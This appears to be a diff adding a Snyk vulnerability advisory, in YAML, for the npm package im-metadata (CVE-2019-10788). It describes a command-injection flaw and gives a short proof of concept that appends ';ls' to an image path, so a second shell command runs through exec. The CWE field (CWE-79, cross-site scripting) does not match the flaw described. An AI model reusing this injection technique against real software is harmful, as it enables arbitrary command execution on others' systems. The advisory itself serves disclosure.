@@ -1,0 +1,29 @@
+---
+- id: snykio:npm:im-metadata:544184
+  title: Command Injection
+  description: "[im-metadata][1] is a package to retrieve image metadata as a JSON\nobject
+    using ImageMagick\\'s identify command.\n\nAffected versions of this package are
+    vulnerable to Command Injection.\nIt is possible to inject arbitrary commands
+    as part of the metadata\noptions which is given to the `exec` function.\n\n###
+    PoC by Snyk Security Team   {#poc-by-snyk-security-team}\n\n    var metadata =
+    require('im-metadata');\n    \n    metadata('/home/snoopy/Pictures/Screenshots/foo.jpg;ls',
+    {exif: true}, function(error, metadata) {\n        if (error) { console.error(error);
+    }\n        console.log(metadata);\n        console.log(metadata.exif);\n      });\n\n\n\n[1]:
+    https://www.npmjs.com/package/im-metadata\n"
+  affected_package: im-metadata
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2019-10788
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-02-04
+  created_date: 2020-02-04
+  last_modified_date: 2020-02-04
+  credit:
+  - Snyk Security Team
+  references:
+  - https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639
+  source_url: https://snyk.io/vuln/SNYK-JS-IMMETADATA-544184
